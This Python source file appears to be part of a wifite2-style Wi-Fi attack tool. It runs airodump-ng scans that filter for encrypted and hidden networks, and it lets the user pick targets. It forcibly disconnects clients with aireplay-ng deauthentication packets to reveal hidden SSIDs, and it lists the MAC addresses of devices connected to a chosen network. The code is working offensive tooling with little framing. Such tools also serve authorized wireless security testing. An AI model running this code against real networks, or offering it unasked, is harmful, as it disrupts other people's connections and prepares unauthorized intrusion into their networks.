import os
import time
import signal
import subprocess
from dataclasses import dataclass
from utils import colored_log, execute_command, sanitize_ssid, check_dependency
from rich.console import Console
from mac_vendor_lookup import MacLookup  # Library to find vendor from MAC addr

# Rich console setup
console = Console()
mac_lookup = MacLookup()


@dataclass
class WiFiNetwork:
    id: int
    bssid: str
    channel: int
    power: int  # PWR in dBm
    essid: str
    encryption: str

    def __str__(self) -> str:
        # Convert PWR (dBm) to percentage (approximation: -100 dBm = 0%, -30 dBm = 100%)
        signal_percent = max(
            0, min(100, int((self.power + 100) * 1.42857))
        )  # Linear approximation
        # Get vendor name from BSSID
        try:
            vendor = mac_lookup.lookup(self.bssid)
        except Exception:
            vendor = "Unknown Vendor"
        return f"[bold][{self.id}][/bold] [bright_green]{self.essid}[/bright_green] ([green]{self.bssid}[/green]) - CH:{self.channel} PWR:{signal_percent}% ({self.power} dBm) [yellow]{self.encryption}[/yellow] - [magenta]Vendor: {vendor}[/magenta]"


def _parse_scan_csv(output_file: str) -> list[WiFiNetwork]:
    """Parse airodump-ng CSV output and return list of networks"""
    networks = []
    
    if not os.path.exists(output_file):
        return networks
    
    try:
        with open(output_file, "r", encoding="utf-8", errors="replace") as f:
            lines = f.readlines()

        data_section = False
        network_id = 0

        for line in [l.strip() for l in lines]:
            if line.startswith("BSSID"):
                data_section = True
                continue
            if line.startswith("Station MAC"):
                break
            if data_section and line:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 14:
                    essid = parts[13].strip().replace("\x00", "")
                    encryption = f"{parts[5]} {parts[6]}".strip()
                    # Skip open networks (OPN)
                    if "OPN" in encryption.upper():
                        continue
                    # Detect hidden SSID
                    if (not essid or essid.startswith("<length:")) and "OPN" not in encryption.upper():
                        essid = "<HIDDEN SSID>"
                    network_id += 1
                    try:
                        networks.append(
                            WiFiNetwork(
                                id=network_id,
                                bssid=parts[0],
                                channel=int(parts[3]) if parts[3].isdigit() else 0,
                                power=(
                                    int(parts[8])
                                    if parts[8].lstrip("-").isdigit()
                                    else 0
                                ),
                                encryption=encryption,
                                essid=essid,
                            )
                        )
                    except (ValueError, IndexError):
                        continue
    except Exception:
        pass
    
    return networks


def _display_networks_live(networks: list[WiFiNetwork]):
    """Display networks with live updates (clear screen style)"""
    import sys
    
    # Use Rich's built-in clear (more reliable than ANSI codes)
    console.clear()
    
    console.print("═" * 100, style="bright_cyan")
    console.print(
        f" {len(networks)} Networks Found - Scanning... (Press Ctrl+C to stop and select targets)",
        style="bold bright_cyan"
    )
    console.print("═" * 100, style="bright_cyan")
    console.print()
    
    # Show networks sorted by signal
    if len(networks) > 25:
        console.print(f"Showing top 25 of {len(networks)} networks:\n", style="yellow")
        display_nets = networks[:25]
    else:
        display_nets = networks
    
    for net in display_nets:
        console.print(str(net))
    
    if len(networks) > 25:
        console.print(f"\n... and {len(networks) - 25} more networks", style="dim")


def scan_networks_continuous(self) -> list[WiFiNetwork]:
    """Continuous real-time network scanning (wifite2-style) until Ctrl+C"""
    from rich.live import Live
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    
    if not self.monitor_interface:
        colored_log("error", "No monitor mode interface found!")
        return []

    # Check dependencies
    if not check_dependency("airodump-ng"):
        colored_log("error", "airodump-ng is required for scanning!")
        return []

    colored_log("info", "Starting continuous WiFi scan (Press Ctrl+C when ready to select targets)...")
    time.sleep(1)  # Brief pause before starting live display
    
    output_file = os.path.join(self.temp_dir, "scan-01.csv")

    # Start airodump-ng in background
    proc = subprocess.Popen(
        [
            "airodump-ng",
            "-w",
            os.path.join(self.temp_dir, "scan"),
            "--output-format",
            "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    def generate_live_display(networks: list[WiFiNetwork]) -> Panel:
        """Generate live display panel"""
        table = Table(show_header=True, header_style="bold cyan", border_style="cyan")
        table.add_column("ID", style="bold", width=4)
        table.add_column("SSID", style="bright_green", width=25)
        table.add_column("BSSID", style="green", width=17)
        table.add_column("CH", style="yellow", width=3)
        table.add_column("PWR", style="magenta", width=6)
        table.add_column("ENC", style="yellow", width=20)
        table.add_column("VENDOR", style="cyan", width=20)
        
        display_nets = networks[:25] if len(networks) > 25 else networks
        
        for net in display_nets:
            signal_percent = max(0, min(100, int((net.power + 100) * 1.42857)))
            pwr_color = "bright_green" if signal_percent > 60 else "yellow" if signal_percent > 30 else "red"
            
            # Safe vendor lookup
            try:
                vendor = mac_lookup.lookup(net.bssid)
                vendor = vendor[:18] if len(vendor) > 18 else vendor
            except Exception:
                vendor = "Unknown"
            
            table.add_row(
                str(net.id),
                net.essid[:23] if len(net.essid) > 23 else net.essid,
                net.bssid,
                str(net.channel),
                f"[{pwr_color}]{signal_percent}%[/{pwr_color}]",
                net.encryption[:18] if len(net.encryption) > 18 else net.encryption,
                vendor
            )
        
        footer_text = ""
        if len(networks) > 25:
            footer_text = f"... and {len(networks) - 25} more networks\n"
        footer_text += "[yellow bold]Press Ctrl+C to stop scanning and select targets[/yellow bold]"
        
        return Panel(
            table,
            title=f"[bold bright_cyan] {len(networks)} Networks Found - Scanning... [/bold bright_cyan]",
            subtitle=footer_text,
            border_style="bright_cyan"
        )

    try:
        networks_dict = {}
        
        # Use Rich Live display for smooth updating without scrolling
        with Live(generate_live_display([]), refresh_per_second=1, console=console) as live:
            while True:
                time.sleep(0.5)
                
                # Parse and update network list
                new_networks = _parse_scan_csv(output_file)
                for net in new_networks:
                    networks_dict[net.bssid] = net
                
                if networks_dict:
                    # Sort by signal strength
                    sorted_networks = sorted(
                        networks_dict.values(),
                        key=lambda x: x.power,
                        reverse=True
                    )
                    # Reassign IDs after sorting for sequential display
                    for i, net in enumerate(sorted_networks, 1):
                        net.id = i
                    
                    # Update live display
                    live.update(generate_live_display(sorted_networks))
                
    except KeyboardInterrupt:
        pass  # Live context will clean up automatically
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()
    
    console.print("\n[*] Scan stopped by user", style="bright_cyan")
    
    # Final sort and ID assignment
    networks_list = sorted(networks_dict.values(), key=lambda x: x.power, reverse=True)
    for i, network in enumerate(networks_list, 1):
        network.id = i
    
    if networks_list:
        colored_log("success", f"Found {len(networks_list)} encrypted/hidden networks")
    else:
        colored_log("warning", "No encrypted/hidden networks detected")
    
    return networks_list


def scan_networks(self) -> list[WiFiNetwork]:
    """Scan available wifi networks, filtering out open networks and sorting by signal strength"""
    if not self.monitor_interface:
        colored_log("error", "No monitor mode interface found!")
        return []

    # Check dependencies
    if not check_dependency("airodump-ng"):
        colored_log("error", "airodump-ng is required for scanning!")
        return []

    colored_log("info", "Starting WiFi network scan...")
    output_file = os.path.join(self.temp_dir, "scan-01.csv")

    # Start airodump-ng
    proc = subprocess.Popen(
        [
            "airodump-ng",
            "-w",
            os.path.join(self.temp_dir, "scan"),
            "--output-format",
            "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        time.sleep(8)
    except KeyboardInterrupt:
        colored_log("warning", "Scanning stopped by user!")
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()

    networks = []

    # Parse CSV results
    if os.path.exists(output_file):
        try:
            with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                lines = f.readlines()

            data_section = False
            network_id = 0

            for line in [l.strip() for l in lines]:
                if line.startswith("BSSID"):
                    data_section = True
                    continue
                if line.startswith("Station MAC"):
                    break
                if data_section and line:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 14:
                        essid = parts[13].strip().replace("\x00", "")
                        encryption = f"{parts[5]} {parts[6]}".strip()
                        # Skip open networks (OPN)
                        if "OPN" in encryption.upper():
                            continue
                        # Detect hidden SSID (empty or <length: X>) for encrypted networks
                        if (
                            not essid or essid.startswith("<length:")
                        ) and "OPN" not in encryption.upper():
                            essid = "<HIDDEN SSID>"
                        network_id += 1
                        try:
                            networks.append(
                                WiFiNetwork(
                                    id=network_id,
                                    bssid=parts[0],
                                    channel=int(parts[3]) if parts[3].isdigit() else 0,
                                    power=(
                                        int(parts[8])
                                        if parts[8].lstrip("-").isdigit()
                                        else 0
                                    ),
                                    encryption=encryption,
                                    essid=essid,
                                )
                            )
                        except (ValueError, IndexError):
                            continue
        except Exception as e:
            colored_log("error", f"Error reading scan results: {e}")
    else:
        colored_log("error", "Scan results file not found!")

    # Sort networks by signal strength (descending order)
    networks.sort(key=lambda x: x.power, reverse=True)
    # Reassign IDs after sorting
    for i, network in enumerate(networks, 1):
        network.id = i

    if networks:
        colored_log("success", f"Found {len(networks)} encrypted or hidden networks.")
    else:
        colored_log("warning", "No encrypted or hidden networks detected.")

    return networks


def decloak_ssid(self, network: WiFiNetwork) -> str | None:
    """Decloak a hidden SSID by capturing probe requests after deauthentication"""
    if network.essid != "<HIDDEN SSID>":
        return network.essid  # No need to decloak if already known

    # Check dependencies
    if not check_dependency("aireplay-ng") or not check_dependency("airodump-ng"):
        colored_log(
            "error", "aireplay-ng and airodump-ng are required to decloak SSID!"
        )
        return None

    colored_log(
        "info", f"Attempting to decloak hidden SSID for BSSID {network.bssid}..."
    )
    output_file = os.path.join(self.temp_dir, "decloak-01.csv")

    # Start airodump-ng to capture probe requests
    proc = subprocess.Popen(
        [
            "airodump-ng",
            "--bssid",
            network.bssid,
            "--channel",
            str(network.channel),
            "-w",
            os.path.join(self.temp_dir, "decloak"),
            "--output-format",
            "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Send deauth packets to force clients to reconnect
    deauth_cmd = [
        "aireplay-ng",
        "--deauth",
        "10",  # Send 10 deauth packets
        "-a",
        network.bssid,
        self.monitor_interface,
    ]
    try:
        subprocess.Popen(
            deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except FileNotFoundError:
        colored_log(
            "error", "aireplay-ng not found. Make sure aircrack-ng suite is installed."
        )
        return None

    try:
        time.sleep(10)  # Wait for clients to reconnect and send probe requests
    except KeyboardInterrupt:
        colored_log("warning", "Decloaking stopped by user!")
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()

    # Parse CSV to find SSID
    if os.path.exists(output_file):
        try:
            with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                lines = f.readlines()

            data_section = False
            for line in [l.strip() for l in lines]:
                if line.startswith("BSSID"):
                    data_section = True
                    continue
                if line.startswith("Station MAC"):
                    break
                if data_section and line:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 14 and parts[0] == network.bssid:
                        essid = parts[13].strip().replace("\x00", "")
                        if essid and not essid.startswith("<length:"):
                            sanitized_essid = sanitize_ssid(essid)
                            colored_log(
                                "success", f"Hidden SSID decloaked: {sanitized_essid}"
                            )
                            return sanitized_essid
        except Exception as e:
            colored_log("error", f"Error reading decloak results: {e}")

    colored_log("warning", f"Failed to decloak SSID for {network.bssid}!")
    return None


def detect_connected_clients(self, network: WiFiNetwork, duration: int = 10) -> list[str]:
    """Detect connected clients to the target network"""
    # Check dependencies
    if not check_dependency("airodump-ng"):
        colored_log("error", "airodump-ng is required!")
        return []

    output_file = os.path.join(self.temp_dir, "client-scan")

    # Clean up old files
    for ext in ["-01.csv", "-01.cap", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]:
        old_file = output_file + ext
        if os.path.exists(old_file):
            os.remove(old_file)

    # Start airodump-ng in background
    proc = subprocess.Popen(
        [
            "airodump-ng",
            "--bssid", network.bssid,
            "--channel", str(network.channel),
            "--write", output_file,
            "--output-format", "csv",
            self.monitor_interface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Show progress countdown with Rich
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
    
    try:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeRemainingColumn(),
            console=console
        ) as progress:
            scan_task = progress.add_task(
                f"Scanning for clients on {network.essid}",
                total=duration
            )
            
            for i in range(duration):
                time.sleep(1)
                progress.update(scan_task, advance=1)
    finally:
        proc.send_signal(signal.SIGTERM)
        proc.wait()

    clients = []

    # Parse client results
    csv_file = f"{output_file}-01.csv"
    if os.path.exists(csv_file):
        try:
            with open(csv_file, "r", encoding="utf-8", errors="replace") as f:
                lines = f.readlines()

            client_section = False
            for line in [l.strip() for l in lines]:
                if line.startswith("Station MAC"):
                    client_section = True
                    continue
                if client_section and line:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 6 and parts[0].strip():
                        clients.append(parts[0])
        except Exception as e:
            colored_log("error", f"Error reading client detection results: {e}!")
    else:
        colored_log("error", "Client detection results file not found!")

    if clients:
        colored_log("success", f"Detected {len(clients)} connected clients!")
    else:
        colored_log("warning", "No connected clients detected.")

    return clients
